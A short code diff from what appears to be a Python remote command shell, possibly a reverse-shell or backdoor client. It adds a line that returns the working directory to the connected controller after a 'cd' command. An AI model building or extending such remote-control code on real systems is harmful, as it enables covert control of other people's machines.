@@ -90,6 +90,7 @@ def receive_commands():
         if data[:2].decode("utf-8") == "cd":
             try:
                 os.chdir(data[3:].decode("utf-8"))
+                s.send(str.encode(str(os.getcwd()) + "> "))
             except:
                 print("Something went wrong")
                 pass
